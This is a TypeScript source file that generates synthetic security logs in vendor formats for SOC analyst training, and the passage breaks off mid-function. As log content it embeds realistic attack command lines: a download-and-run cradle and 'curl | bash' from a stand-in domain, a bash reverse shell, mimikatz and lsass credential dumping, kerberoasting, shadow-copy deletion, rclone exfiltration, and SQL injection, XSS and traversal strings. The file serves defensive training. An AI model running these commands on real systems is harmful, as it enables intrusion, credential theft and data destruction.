import { randomUUID, createHash } from "crypto";
import { EVENT_TYPES, MANUFACTURERS, SEVERITIES, SIMULATION_MODES } from "@/lib/constants";
import { findTechniqueForEvent, getTechniqueById } from "@/lib/mitre";
import { clamp, pick, randomInt } from "@/lib/utils";
import type { AiScenarioInput, GenerateInput } from "@/lib/validators";

export type GeneratedLogRecord = {
  id: string;
  timestamp: Date;
  vendor: string;
  product?: string | null;
  eventType: string;
  severity: string;
  sourceIp?: string | null;
  destinationIp?: string | null;
  username?: string | null;
  hostname?: string | null;
  mitreId?: string | null;
  mitreTactic?: string | null;
  mitreTechnique?: string | null;
  riskScore: number;
  confidence: number;
  raw: string;
  jsonPayload: string;
  scenarioId?: string | null;
};

type Context = {
  id: string;
  timestamp: Date;
  vendor: string;
  eventType: string;
  severity: string;
  srcIp: string;
  dstIp: string;
  username: string;
  hostname: string;
  destinationHost: string;
  domain: string;
  url: string;
  hash: string;
  userAgent: string;
  process: string;
  command: string;
  action: string;
  port: number;
  proto: "TCP" | "UDP";
  mitre: ReturnType<typeof findTechniqueForEvent>;
  riskScore: number;
  confidence: number;
  isBenign: boolean;
  realismLevel: "operacional" | "laboratório" | "simplificado";
};

const USERS = ["jsantos", "mcarvalho", "rteixeira", "svc_backup", "svc_sql", "admin.ops", "faugusto", "helpdesk01", "financeiro02", "secops"];
const HOST_PREFIXES = ["WIN", "SRV", "DC", "WEB", "DB", "K8S", "LIN", "VDI", "FW", "MAIL"];
const DOMAINS = ["corp.local", "empresa.local", "lab.internal", "aicar.local", "secure-corp.org"];
const EXTERNAL_DOMAINS = ["cdn-update-check.net", "ms-login-sync.com", "storage-cloud-files.org", "telemetry-gateway.io", "dns-health-checker.net"];
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0",
  "curl/8.1.2",
  "python-requests/2.31.0",
  "Go-http-client/1.1",
  "Mozilla/5.0 zgrab/0.x"
];

const COMMANDS: Record<string, string[]> = {
  "PowerShell": [
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    "powershell.exe -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://cdn-update-check.net/a.ps1')",
    "powershell.exe Get-ADUser -Filter * -Properties ServicePrincipalName"
  ],
  "CMD": ["cmd.exe /c whoami /all", "cmd.exe /c net group 'Domain Admins' /domain", "cmd.exe /c dir \\filesrv01\\share"],
  "Linux Bash": ["/bin/bash -c 'curl -fsSL http://cdn-update-check.net/p.sh | bash'", "/bin/bash -i >& /dev/tcp/198.51.100.23/4444 0>&1", "bash -c 'id; uname -a; ps aux'"],
  "Mimikatz": ["mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"],
  "Dump de credenciais": ["rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\ProgramData\\lsass.dmp full"],
  "Kerberoasting": ["setspn.exe -Q */*", "Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap"],
  "Golden Ticket": ["mimikatz.exe kerberos::golden /domain:corp.local /sid:S-1-5-21-1000 /krbtgt:HASH /user:administrator"],
  "Pass-the-Hash": ["wmic.exe /node:SRV-FILE-01 /user:corp\\admin.ops process call create 'cmd.exe /c whoami'"],
  "Ransomware": ["vssadmin.exe delete shadows /all /quiet", "cipher.exe /w:C:", "ransom.exe --encrypt --path \\filesrv01\\share"],
  "Web Shell": ["POST /uploads/shell.aspx?cmd=whoami HTTP/1.1"],
  "SQL Injection": ["GET /login?id=1%27%20OR%201=1-- HTTP/1.1"],
  "XSS": ["GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1"],
  "Directory Traversal": ["GET /download?file=../../../../etc/passwd HTTP/1.1"],
  "Nmap": ["nmap -sS -T4 -p 1-1000 10.10.20.0/24"],
  "Masscan": ["masscan 10.10.20.0/24 -p1-65535 --rate 5000"],
  "Hydra": ["hydra -L users.txt -P pass.txt ssh://187.32.49.184"],
  "Beacon C2": ["beacon sleep 60 jitter 20 checkin"],
  "Exfiltração": ["rclone copy \\filesrv01\\finance mega:backup --progress"],
  "default": ["process execution simulated for training"]
};

const PORTS_BY_EVENT: Record<string, number[]> = {
  SSH: [22],
  FTP: [21],
  SMTP: [25, 587],
  SMB: [445, 139],
  LDAP: [389, 636],
  HTTP: [80, 8080],
  HTTPS: [443, 8443],
  RDP: [3389],
  VPN: [500, 4500, 1194],
  DNS: [53],
  "DNS Tunneling": [53],
  "SQL Injection": [80, 443],
  XSS: [80, 443],
  "Directory Traversal": [80, 443],
  "FortiGate Traffic Forward": [13000, 161, 443],
  "FortiGate App Control": [443],
  "FortiGate IPS": [80, 443],
  "FortiWeb HTTPS": [443],
  "Windows 5145 - Acesso SMB": [445],
  "IIS 401 - Não autorizado": [443]
};

const SOC_DAILY_MIX = [
  { vendor: "FortiGate", eventType: "FortiGate Traffic Forward" },
  { vendor: "FortiGate", eventType: "FortiGate Traffic Forward" },
  { vendor: "FortiGate", eventType: "FortiGate App Control" },
  { vendor: "FortiGate", eventType: "FortiGate IPS" },
  { vendor: "FortiGate", eventType: "FortiGate Config Change" },
  { vendor: "FortiWeb", eventType: "FortiWeb HTTPS" },
  { vendor: "Windows Security", eventType: "Windows 4624 - Logon bem-sucedido" },
  { vendor: "Windows Security", eventType: "Windows 4625 - Falha de logon" },
  { vendor: "Active Directory", eventType: "Windows 4771 - Falha Kerberos" },
  { vendor: "Windows Security", eventType: "Windows 5145 - Acesso SMB" },
  { vendor: "Active Directory", eventType: "Windows 4724 - Redefinição de senha" },
  { vendor: "Active Directory", eventType: "Windows 4728 - Membro adicionado a grupo" },
  { vendor: "Active Directory", eventType: "Windows 4735 - Grupo alterado" },
  { vendor: "Active Directory", eventType: "Windows 4738 - Conta de usuário alterada" },
  { vendor: "Windows Security", eventType: "Windows 5038 - Falha de integridade" },
  { vendor: "Windows Security", eventType: "Windows 1511 - Perfil temporário" },
  { vendor: "Microsoft IIS", eventType: "IIS 401 - Não autorizado" },
  { vendor: "Linux Auditd", eventType: "Linux Auditd - Execução de processo" },
  { vendor: "Linux Auditd", eventType: "Linux Auditd - Comando who" },
  { vendor: "Linux Auditd", eventType: "Linux Auditd - Base64" },
  { vendor: "VMware", eventType: "VMware - Utilização de interface" },
  { vendor: "Trend Vision One", eventType: "Trend Vision One - Arquivo via SMB" },
  { vendor: "Trend Vision One", eventType: "Trend Vision One - SELinux desabilitado" }
] as const;

function privateIp() {
  const ranges = [
    () => `10.${randomInt(0, 40)}.${randomInt(0, 255)}.${randomInt(1, 254)}`,
    () => `172.${randomInt(16, 31)}.${randomInt(0, 255)}.${randomInt(1, 254)}`,
    () => `192.168.${randomInt(0, 250)}.${randomInt(1, 254)}`
  ];
  return pick(ranges)();
}

function publicIp() {
  const blocks = [
    () => `198.51.100.${randomInt(2, 250)}`,
    () => `203.0.113.${randomInt(2, 250)}`,
    () => `45.${randomInt(10, 250)}.${randomInt(10, 250)}.${randomInt(2, 250)}`,
    () => `185.${randomInt(10, 250)}.${randomInt(10, 250)}.${randomInt(2, 250)}`,
    () => `64.62.${randomInt(100, 210)}.${randomInt(2, 250)}`
  ];
  return pick(blocks)();
}

function randomHost(prefix = pick(HOST_PREFIXES)) {
  return `${prefix}-${pick(["APP", "DB", "DC", "WEB", "FIN", "SOC", "MAIL", "K8S"])}-${String(randomInt(1, 99)).padStart(2, "0")}`;
}

function randomHash(seed: string) {
  return createHash("sha256").update(`${seed}-${Math.random()}`).digest("hex");
}

function eventCommand(eventType: string) {
  return pick(COMMANDS[eventType] || COMMANDS.default);
}

function eventPort(eventType: string) {
  return pick(PORTS_BY_EVENT[eventType] || [22, 53, 80, 443, 445, 3389, 5432, 3306, 8080, 8443]);
}

function isNetworkVendor(vendor: string) {
  return ["FortiGate", "Firewall", "pfSense", "Cisco ASA", "Cisco IOS", "Mikrotik", "Suricata", "Zeek", "DNS", "DHCP", "VPN"].includes(vendor);
}

function isWindowsVendor(vendor: string) {
  return ["Sysmon", "Windows Security", "Active Directory", "Microsoft Defender", "Office 365", "Exchange"].includes(vendor);
}

function isCloudVendor(vendor: string) {
  return ["AWS CloudTrail", "Azure", "Kubernetes", "Docker"].includes(vendor);
}

function eventRisk(baseSeverity: string, techniqueScore: number, isBenign: boolean) {
  const severityBoost: Record<string, number> = {
    informational: 5,
    low: 15,
    medium: 35,
    high: 60,
    critical: 82
  };
  const score = Math.round((severityBoost[baseSeverity] + techniqueScore) / 2 + randomInt(-7, 7));
  return isBenign ? randomInt(1, 25) : clamp(score, 1, 100);
}

function buildContext(input: {
  vendor: string;
  eventType: string;
  severity: string;
  timestamp?: Date;
  forcedMitreId?: string;
  isBenign?: boolean;
  realismLevel?: "operacional" | "laboratório" | "simplificado";
}): Context {
  const technique = getTechniqueById(input.forcedMitreId) || findTechniqueForEvent(input.eventType);
  const isBenign = Boolean(input.isBenign);
  const srcInternal = isBenign || Math.random() > 0.45;
  const dstInternal = isBenign || Math.random() > 0.35;
  const srcIp = srcInternal ? privateIp() : publicIp();
  const dstIp = dstInternal ? privateIp() : publicIp();
  const hostname = randomHost();
  const destinationHost = randomHost();
  const id = randomUUID();
  const riskScore = eventRisk(input.severity, technique.riskScore, isBenign);

  return {
    id,
    timestamp: input.timestamp || new Date(Date.now() - randomInt(0, 24 * 60 * 60 * 1000)),
    vendor: input.vendor,
    eventType: input.eventType,
    severity: isBenign ? pick(["informational", "low"] as const) : input.severity,
    srcIp,
    dstIp,
    username: isBenign ? pick(USERS.filter((u) => !u.startsWith("svc_"))) : pick(USERS),
    hostname,
    destinationHost,
    domain: pick(DOMAINS),
    url: `https://${pick(EXTERNAL_DOMAINS)}/${pick(["api/checkin", "cdn/a.dat", "login/sync", "upload", "gate"])}`,
    hash: randomHash(id),
    userAgent: pick(USER_AGENTS),
    process: pick(["powershell.exe", "cmd.exe", "rundll32.exe", "w3wp.exe", "sshd", "nginx", "python", "kubectl", "mysqld", "postgres"]),
    command: isBenign ? pick(["whoami", "gpupdate /force", "GET /health HTTP/1.1", "kubectl get pods", "SELECT 1"]) : eventCommand(input.eventType),
    action: isBenign ? pick(["allowed", "success", "accept", "pass"]) : pick(["blocked", "dropped", "alert", "detected", "success"]),
    port: eventPort(input.eventType),
    proto: Math.random() > 0.75 ? "UDP" : "TCP",
    mitre: technique,
    riskScore,
    confidence: isBenign ? Number((Math.random() * 0.3 + 0.45).toFixed(2)) : Number((technique.confidence + Math.random() * 0.1 - 0.05).toFixed(2)),
    isBenign,
    realismLevel: input.realismLevel || "operacional"
  };
}

function basePayload(ctx: Context) {
  return {
    id: ctx.id,
    timestamp: ctx.timestamp.toISOString(),
    vendor: ctx.vendor,
    event_type: ctx.eventType,
    severity: ctx.severity,
    action: ctx.action,
    src_ip: ctx.srcIp,
    dst_ip: ctx.dstIp,
    dst_port: ctx.port,
    protocol: ctx.proto,
    username: ctx.username,
    hostname: ctx.hostname,
    destination_host: ctx.destinationHost,
    domain: ctx.domain,
    url: ctx.url,
    hash_sha256: ctx.hash,
    user_agent: ctx.userAgent,
    process: ctx.process,
    command_line: ctx.command,
    mitre: {
      tactic: ctx.mitre.tactic,
      technique: ctx.mitre.technique,
      sub_technique: ctx.mitre.subTechnique || null,
      id: ctx.mitre.id,
      severity: ctx.severity,
      confidence: ctx.confidence,
      risk_score: ctx.riskScore,
      behavior: ctx.mitre.description,
      possible_detection: ctx.mitre.detection,
      response_recommendation: ctx.mitre.recommendation
    },
    synthetic: true,
    educational_use_only: true
  };
}

function syslogPrefix(ctx: Context) {
  const pri = ctx.severity === "critical" ? 186 : ctx.severity === "high" ? 188 : 189;
  return `<${pri}>date=${ctx.timestamp.toISOString().slice(0, 10)} time=${ctx.timestamp.toISOString().slice(11, 19)}`;
}

function buildFortinet(ctx: Context) {
  if (ctx.eventType === "FortiGate Traffic Forward") {
    const action = pick(["close", "accept", "client-rst", "server-rst", "timeout"]);
    const proto = ctx.port === 161 || ctx.port === 53 ? 17 : 6;
    return `<189>date=${ctx.timestamp.toISOString().slice(0, 10)} time=${ctx.timestamp.toISOString().slice(11, 19)} devname="FGT-LAB-01" devid="FGVM-AILOG-0001" eventtime=${ctx.timestamp.getTime() * 1_000_000} tz="-0300" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=${ctx.srcIp} srcname="${ctx.hostname}" srcport=${randomInt(49152, 65535)} srcintf="VLAN_${randomInt(10, 120)}" srcintfrole="lan" dstip=${ctx.dstIp} dstport=${ctx.port} dstintf="VLAN_${randomInt(10, 120)}" dstintfrole="lan" sessionid=${randomInt(1000000000, 2147483647)} proto=${proto} action="${action}" policyid=${randomInt(20, 350)} policytype="policy" poluuid="${ctx.id}" policyname="LAB-SERVICE-POLICY" user="${ctx.username}" service="${ctx.port === 161 ? "SNMP" : ctx.port === 443 ? "HTTPS" : "TCP-PORT"}" trandisp="noop" duration=${randomInt(1, 120)} sentbyte=${randomInt(64, 80000)} rcvdbyte=${action === "timeout" ? 0 : randomInt(0, 90000)} sentpkt=${randomInt(1, 120)} rcvdpkt=${action === "timeout" ? 0 : randomInt(0, 120)}`;
  }
  if (ctx.eventType === "FortiGate App Control") {
    return `<190>date=${ctx.timestamp.toISOString().slice(0, 10)} time=${ctx.timestamp.toISOString().slice(11, 19)} devname="FGT-LAB-01" devid="FGVM-AILOG-0001" eventtime=${ctx.timestamp.getTime() * 1_000_000} tz="-0300" logid="1059028704" type="utm" subtype="app-ctrl" eventtype="signature" level="information" vd="root" appid=34039 user="${ctx.username}" srcip=${ctx.srcIp} dstip=${ctx.dstIp} srcport=${randomInt(49152, 65535)} dstport=443 srcintf="VLAN_${randomInt(10, 120)}" dstintf="WAN" proto=6 service="HTTPS" direction="outgoing" policyid=${randomInt(20, 100)} sessionid=${randomInt(1000000000, 2147483647)} applist="APP_PROFILE_LAB" action="pass" appcat="Web.Client" app="HTTP.BROWSER_CHROME" hostname="${ctx.domain}" incidentserialno=${randomInt(100000, 999999)} msg="Application control detected: HTTP.BROWSER_CHROME"`;
  }
  if (ctx.eventType === "FortiGate Config Change") {
    return `<190>date=${ctx.timestamp.toISOString().slice(0, 10)} time=${ctx.timestamp.toISOString().slice(11, 19)} devname="FGT-LAB-01" devid="FGVM-AILOG-0001" eventtime=${ctx.timestamp.getTime() * 1_000_000} tz="-0300" logid="0100044547" type="event" subtype="system" level="information" vd="root" logdesc="Object attribute configured" user="${ctx.username}" ui="https" action="Edit" cfgtid=${randomInt(10000000, 99999999)} uuid="${ctx.id}" cfgpath="firewall.addrgrp" cfgobj="LAB_ADDRESS_GROUP" cfgattr="member updated" msg="Edit firewall.addrgrp LAB_ADDRESS_GROUP"`;
  }
  return `${syslogPrefix(ctx)} devname="FGT-AILOG-01" devid="FGVMMLAB0001" eventtime=${ctx.timestamp.getTime() * 1_000_000} tz="-0300" logid="0419016384" type="utm" subtype="ips" level="${ctx.severity}" vd="root" srcip=${ctx.srcIp} srcport=${randomInt(1024, 65000)} srcintf="wan1" dstip=${ctx.dstIp} dstport=${ctx.port} dstintf="LAN" proto=${ctx.proto === "TCP" ? 6 : 17} action="${ctx.action}" policyid=${randomInt(1, 50)} attack="${ctx.eventType}" severity="${ctx.severity}" user="${ctx.username}" hostname="${ctx.hostname}" mitreid="${ctx.mitre.id}" msg="Synthetic ${ctx.eventType} detected for SOC training"`;
}

function buildWindows(ctx: Context) {
  const explicitId = ctx.eventType.match(/Windows (\d{4})/)?.[1];
  const eventId = explicitId ? Number(explicitId) : ctx.eventType === "Falha de autenticação" ? 4625 : ctx.eventType === "Logon" ? 4624 : ctx.eventType === "Alteração de grupos" ? 4732 : ctx.eventType === "Criação de usuários" ? 4720 : ctx.vendor === "Sysmon" ? 1 : 4688;
  const status = eventId === 4625 ? "0xC000006D" : eventId === 4771 ? "0x18" : "0x0";
  const logonType = pick([2, 3, 5, 7, 10]);
  return `${ctx.timestamp.toISOString()} ${ctx.hostname}.${ctx.domain} ${ctx.dstIp} FSM-WUA-WinLog-${eventId === 1511 ? "Application" : "Security"} [customer]="Synthetic SOC Lab" [monitorStatus]="Success" [Locale]="pt-BR" [timeZone]="-0300" [level]="${eventId === 1511 || eventId === 5038 ? "Error" : "Information"}" [xml]=<Event><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>${eventId}</EventID><TimeCreated SystemTime="${ctx.timestamp.toISOString()}"/></System><EventData><Data Name="TargetUserName">${ctx.username}</Data><Data Name="TargetDomainName">${ctx.domain.split(".")[0].toUpperCase()}</Data><Data Name="LogonType">${logonType}</Data><Data Name="IpAddress">${ctx.srcIp}</Data><Data Name="IpPort">${randomInt(49152, 65535)}</Data><Data Name="WorkstationName">${ctx.destinationHost}</Data><Data Name="Status">${status}</Data><Data Name="ProcessName">${ctx.process}</Data><Data Name="ShareName">\\\\*\\IPC$</Data><Data Name="RelativeTargetName">${eventId === 5145 ? "srvsvc" : "-"}</Data></EventData></Event>`;
}

function buildLinux(ctx: Context) {
  const command = ctx.eventType.includes("Base64") ? "base64" : ctx.eventType.includes("who") ? "who" : pick(["who", "kmod", "curl", "bash"]);
  const uid = command === "who" ? 984 : command === "base64" ? 42 : 0;
  return `<182>${ctx.timestamp.toUTCString().slice(5, 22)} ${ctx.hostname} audispd: type=SYSCALL msg=audit(${Math.floor(ctx.timestamp.getTime() / 1000)}.${randomInt(100, 999)}:${randomInt(1000, 9999999)}): arch=c000003e syscall=59 success=yes exit=0 a0=${ctx.hash.slice(0, 12)} a1=${ctx.hash.slice(12, 24)} items=2 ppid=${randomInt(1000, 4000000)} pid=${randomInt(1000, 4000000)} auid=4294967295 uid=${uid} gid=${uid} euid=${uid} tty=(none) ses=4294967295 comm="${command}" exe="/usr/bin/${command}" subj=unconfined key="LINUX_PROCESS_EXEC" ARCH=x86_64 SYSCALL=execve AUID="unset" UID="${command === "who" ? "zabbix" : command === "base64" ? "_apt" : "root"}"`;
}

function buildFortiWeb(ctx: Context) {
  return `<189>date=${ctx.timestamp.toISOString().slice(0, 10)} time=${ctx.timestamp.toISOString().slice(11, 19)} log_id=30001000 msg_id=${String(randomInt(1, 999999999999)).padStart(12, "0")} device_id=FVVM-AILOG-01 eventtime=${ctx.timestamp.getTime() * 1_000_000} vd="root" timezone="(GMT-3:00)Brasilia" type=traffic subtype=https pri=notice proto=tcp service=https/tls1.3 status=success reason=none policy="LAB_IIS_POLICY" original_src=${ctx.srcIp} src=${ctx.srcIp} src_port=${randomInt(1024, 65535)} dst=${ctx.dstIp} dst_port=443 http_request_time=${randomInt(0, 50)} http_response_time=${randomInt(0, 200)} http_request_bytes=${randomInt(200, 1800)} http_response_bytes=${randomInt(100, 5000)} http_method=${pick(["get", "post"])} http_url="/${pick(["api/health", "login", "xmlrpc.php", "wp-login.php"])}" http_agent="${ctx.userAgent}" http_retcode=${pick([200, 401, 403, 404, 405])} msg="Synthetic HTTPS request from ${ctx.srcIp}"`;
}

function buildIis(ctx: Context) {
  return `${ctx.timestamp.toISOString()} ${ctx.hostname}.${ctx.domain} ${ctx.dstIp} AccelOps-WUA-IIS [customer]="Synthetic SOC Lab" [monitorStatus]="Success" [timeZone]="-0300" [date]="${ctx.timestamp.toISOString().slice(0, 10)}" [time]="${ctx.timestamp.toISOString().slice(11, 19)}" [s-ip]="${ctx.dstIp}" [cs-method]="POST" [cs-uri-stem]="/api/v1/requests/pending" [s-port]="443" [cs-username]="-" [c-ip]="${ctx.srcIp}" [cs(User-Agent)]="${ctx.userAgent}" [sc-status]="401" [sc-substatus]="2" [sc-win32-status]="5" [time-taken]="${randomInt(10, 900)}"`;
}

function buildTrend(ctx: Context) {
  const selinux = ctx.eventType.includes("SELinux");
  return JSON.stringify({eventTime: ctx.timestamp.toISOString(), product: "Trend Vision One", model: selinux ? "Suspicious Activity Evidence" : "Workbench", alertName: selinux ? "SELinux was disabled to allow malicious processes to run" : "Uncommon file dropped in noteworthy folder via SMB", severity: selinux ? "high" : ctx.severity, endpoint: ctx.hostname, endpointIp: ctx.srcIp, user: selinux ? "root" : "NT AUTHORITY\\SYSTEM", processName: selinux ? "setenforce" : "System", destinationHost: ctx.destinationHost, uuid: ctx.id, riskScore: ctx.riskScore, synthetic: true});
}

function buildVmware(ctx: Context) {
  return `<134>${ctx.timestamp.toUTCString().slice(5, 22)} ${ctx.srcIp} java: [PH_DEV_MON_NET_INTF_UTIL]:[eventSeverity]=PHL_INFO,[hostName]=${ctx.hostname}.${ctx.domain},[hostIpAddr]=${ctx.srcIp},[pollIntv]=180,[folder]=root,[intfName]=vmnic1,[totBitsPerSec]=${randomInt(1000000, 1000000000)},[sentBytes64]=${randomInt(1000000, 9000000000)},[outIntfUtil]=${(Math.random() * 80).toFixed(3)},[recvBytes64]=${randomInt(1000000, 9000000000)},[inIntfUtil]=${(Math.random() * 80).toFixed(3)},[outIntfPktDiscarded]=0,[inIntfPktDiscarded]=0,[extEventRecvProto]=VM_SDK`;
}

function buildWeb(ctx: Context) {
  const methods = ["GET", "POST", "PUT"];
  const path = ctx.eventType === "SQL Injection" ? "/login?id=1%27%20OR%201=1--" : ctx.eventType === "XSS" ? "/search?q=%3Cscript%3Ealert(1)%3C/script%3E" : ctx.eventType === "Directory Traversal" ? "/download?file=../../../../etc/passwd" : "/api/v1/health";
  const status = ctx.isBenign ? pick([200, 204, 301]) : pick([200, 403, 404, 500]);
  return `${ctx.srcIp} - ${ctx.username} [${ctx.timestamp.toISOString()}] "${pick(methods)} ${path} HTTP/1.1" ${status} ${randomInt(100, 98000)} "-" "${ctx.userAgent}" host="${ctx.hostname}" dst="${ctx.dstIp}:${ctx.port}" mitre="${ctx.mitre.id}" severity="${ctx.severity}"`;
}

function buildCloud(ctx: Context) {
  const provider = ctx.vendor.includes("AWS") ? "aws" : ctx.vendor.includes("Azure") ? "azure" : ctx.vendor.toLowerCase();
  return JSON.stringify({
    eventVersion: "1.10",
    eventTime: ctx.timestamp.toISOString(),
    eventSource: provider === "aws" ? "signin.amazonaws.com" : "management.azure.com",
    eventName: ctx.eventType.replaceAll(" ", ""),
    sourceIPAddress: ctx.srcIp,
    userAgent: ctx.userAgent,
    userIdentity: { type: "IAMUser", userName: ctx.username },
    requestParameters: { command: ctx.command, destination: ctx.dstIp },
    responseElements: { action: ctx.action },
    mitre: { id: ctx.mitre.id, tactic: ctx.mitre.tactic, technique: ctx.mitre.technique },
    severity: ctx.severity,
    synthetic: true
  });
}

function buildNetwork(ctx: Context) {
  if (ctx.vendor === "Zeek") {
    return `#separator \x09\n${ctx.timestamp.getTime() / 1000}\t${ctx.id.slice(0, 8)}\t${ctx.srcIp}\t${randomInt(1024, 65000)}\t${ctx.dstIp}\t${ctx.port}\t${ctx.proto.toLowerCase()}\t${ctx.eventType}\t${ctx.severity}\t${ctx.mitre.id}`;
  }

  if (ctx.vendor === "Suricata") {
    return JSON.stringify({
      timestamp: ctx.timestamp.toISOString(),
      event_type: "alert",
      src_ip: ctx.srcIp,
      src_port: randomInt(1024, 65000),
      dest_ip: ctx.dstIp,
      dest_port: ctx.port,
      proto: ctx.proto,
      alert: {
        action: ctx.action,
        signature: `Synthetic ${ctx.eventType} ${ctx.mitre.id}`,
        category: ctx.mitre.tactic,
        severity: ctx.riskScore >= 80 ? 1 : ctx.riskScore >= 50 ? 2 : 3
      }
    });
  }

  return `${ctx.timestamp.toISOString()} ${ctx.vendor} src=${ctx.srcIp} dst=${ctx.dstIp} sport=${randomInt(1024, 65000)} dport=${ctx.port} proto=${ctx.proto} action=${ctx.action} event="${ctx.eventType}" severity=${ctx.severity} user=${ctx.username} host=${ctx.hostname} mitre=${ctx.mitre.id}`;
}

function buildDatabase(ctx: Context) {
  const query = ctx.eventType === "SQL Injection" ? "SELECT * FROM users WHERE id='1' OR '1'='1'" : "SELECT 1";
  return `${ctx.timestamp.toISOString()} ${ctx.vendor} user=${ctx.username} db=appdb client=${ctx.srcIp} host=${ctx.hostname} severity=${ctx.severity} statement="${query}" action=${ctx.action} mitre=${ctx.mitre.id}`;
}

function buildRaw(ctx: Context) {
  if (ctx.realismLevel === "simplificado") {
    return `${ctx.timestamp.toISOString()} vendor="${ctx.vendor}" event="${ctx.eventType}" severity=${ctx.severity} action=${ctx.action} src=${ctx.srcIp} dst=${ctx.dstIp} dport=${ctx.port} user=${ctx.username} host=${ctx.hostname} synthetic=true`;
  }
  if (ctx.vendor === "FortiGate" || ctx.vendor === "FortiSIEM") return buildFortinet(ctx);
  if (ctx.vendor === "FortiWeb") return buildFortiWeb(ctx);
  if (ctx.vendor === "Microsoft IIS") return buildIis(ctx);
  if (ctx.vendor === "Trend Vision One") return buildTrend(ctx);
  if (ctx.vendor === "VMware") return buildVmware(ctx);
  if (isWindowsVendor(ctx.vendor)) return buildWindows(ctx);
  if (ctx.vendor === "Linux Auditd" || ctx.vendor === "SSH") return buildLinux(ctx);
  if (["Apache", "Nginx"].includes(ctx.vendor)) return buildWeb(ctx);
  if (isCloudVendor(ctx.vendor)) return buildCloud(ctx);
  if (["PostgreSQL", "MySQL"].includes(ctx.vendor)) return buildDatabase(ctx);
  if (isNetworkVendor(ctx.vendor)) return buildNetwork(ctx);
  return `${ctx.timestamp.toISOString()} ${ctx.vendor} event="${ctx.eventType}" severity=${ctx.severity} src=${ctx.srcIp} dst=${ctx.dstIp} user=${ctx.username} host=${ctx.hostname} command="${ctx.command}" mitre=${ctx.mitre.id}`;
}

export function generateOne(input: {
  vendor: string;
  eventType: string;
  severity: string;
  timestamp?: Date;
  forcedMitreId?: string;
  scenarioId?: string;
  isBenign?: boolean;
  realismLevel?: "operacional" | "laboratório" | "simplificado";
}): GeneratedLogRecord {
  const ctx = buildContext(input);
  const payload = basePayload(ctx);
  const raw = buildRaw(ctx);

  return {
    id: ctx.id,
    timestamp: ctx.timestamp,
    vendor: ctx.vendor,
    product: ctx.vendor,
    eventType: ctx.eventType,
    severity: ctx.severity,
    sourceIp: ctx.srcIp,
    destinationIp: ctx.dstIp,
    username: ctx.username,
    hostname: ctx.hostname,
    mitreId: ctx.isBenign ? null : ctx.mitre.id,
    mitreTactic: ctx.isBenign ? null : ctx.mitre.tactic,
    mitreTechnique: ctx.isBenign ? null : ctx.mitre.technique,
    riskScore: ctx.riskScore,
    confidence: ctx.confidence,
    raw,
    jsonPayload: JSON.stringify(payload),
    scenarioId: input.scenarioId || null
  };
}

export function generateLogBatch(input: GenerateInput & { scenarioId?: string }) {
  const logs: GeneratedLogRecord[] = [];
  const technique = findTechniqueForEvent(input.eventType);
  const safeCount = clamp(input.count, 1, 5000);
  const benignRate = input.noiseLevel / 100;

  const profileEvents = input.generationProfile === "Autenticação Windows"
      ? SOC_DAILY_MIX.filter((item) => item.eventType.startsWith("Windows "))
      : input.generationProfile === "Perímetro Fortinet"
        ? SOC_DAILY_MIX.filter((item) => item.vendor === "FortiGate" || item.vendor === "FortiWeb")
        : input.generationProfile === "Servidores Linux"
          ? SOC_DAILY_MIX.filter((item) => item.vendor === "Linux Auditd" || item.vendor === "Trend Vision One")
          : input.generationProfile === "Aplicações Web"
            ? SOC_DAILY_MIX.filter((item) => item.vendor === "Microsoft IIS" || item.vendor === "FortiWeb")
            : SOC_DAILY_MIX;

  for (let i = 0; i < safeCount; i++) {
    const isBenign = Math.random() < benignRate;
    const daily = input.eventType === "Rotina SOC N1 - Mix diário" ? pick(profileEvents) : null;
    const vendor = daily?.vendor || input.vendor;
    const eventType = daily?.eventType || (isBenign ? pick(["Logon", "Logoff", "HTTP", "DNS", "DHCP", "HTTPS"] as const) : input.eventType);
    const timestamp = new Date(Date.now() - (safeCount - i) * randomInt(500, 3500));
    logs.push(
      generateOne({
        vendor,
        eventType,
        severity: input.severity,
        timestamp,
        forcedMitreId: daily ? undefined : technique.id,
        scenarioId: input.scenarioId,
        isBenign,
        realismLevel: input.realismLevel
      })
    );
  }

  return logs;
}

export function generateScenarioLogs(input: AiScenarioInput, scenarioId: string) {
  const logs: GeneratedLogRecord[] = [];
  const start = Date.now() - input.durationHours * 60 * 60 * 1000;

  for (let i = 0; i < input.logCount; i++) {
    const vendor = pick(input.vendors);
    const isBenign = Math.random() < input.noiseLevel / 100;
    const eventType = isBenign ? pick(["Logon", "Logoff", "HTTP", "DNS", "HTTPS", "Criação de processos"] as const) : input.attackType;
    const timestamp = new Date(start + Math.floor((i / input.logCount) * input.durationHours * 60 * 60 * 1000) + randomInt(0, 60_000));

    logs.push(
      generateOne({
        vendor,
        eventType,
        severity: input.severity,
        timestamp,
        scenarioId,
        isBenign
      })
    );
  }

  return logs.sort((a, b) => a.timestamp.getTime() - b.timestamp.getTime());
}

export function buildScenarioSummary(input: AiScenarioInput) {
  const technique = findTechniqueForEvent(input.attackType);
  const vendors = input.vendors.join(", ");
  const name = `${input.companyType} - ${input.attackType} - ${new Date().toISOString().slice(0, 10)}`;

  const timeline = [
    { phase: "Reconhecimento", offset: "0%", description: "Ator identifica superfície de ataque, portas e serviços acessíveis." },
    { phase: "Acesso inicial", offset: "15%", description: `Evento principal simulado: ${input.attackType}.` },
    { phase: "Execução", offset: "35%", description: "Comandos e processos aparecem misturados a eventos benignos." },
    { phase: "Persistência ou movimentação", offset: "55%", description: "Ações de expansão, autenticação ou uso de credenciais conforme o cenário." },
    { phase: "Impacto ou exfiltração", offset: "80%", description: "Pico de severidade, IOCs e eventos de rede correlacionáveis." }
  ];

  const iocs = [
    { type: "ip", value: publicIp(), confidence: input.severity === "critical" ? 0.9 : 0.72 },
    { type: "domain", value: pick(EXTERNAL_DOMAINS), confidence: 0.78 },
